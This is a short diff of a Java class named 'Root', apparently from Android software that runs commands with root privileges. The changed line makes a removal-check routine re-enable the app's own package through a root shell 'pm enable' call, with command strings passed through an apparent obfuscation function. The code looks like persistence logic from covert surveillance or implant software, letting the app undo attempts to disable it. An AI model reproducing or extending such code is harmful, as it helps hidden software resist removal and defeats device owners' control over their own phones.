@@ -348,10 +348,9 @@ public class Root {
 			}
 			try {
 
-
 				String packageName = Status.getAppContext().getPackageName();
 				if (packageName != null) {
-					Execute.execute(String.format(M.e("%s qzx \"pm enable %s \'"), Configuration.shellFile , packageName));
+					Execute.executeRoot(String.format(M.e("pm enable %s"), packageName));
 				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkRemoval): unable to get package name");
@@ -373,6 +372,7 @@ public class Root {
 		}
 		return true;
 	}
+
 	synchronized static public boolean uninstallRoot() {
 		if (!Status.haveRoot()) {
 			if (Cfg.DEBUG) {
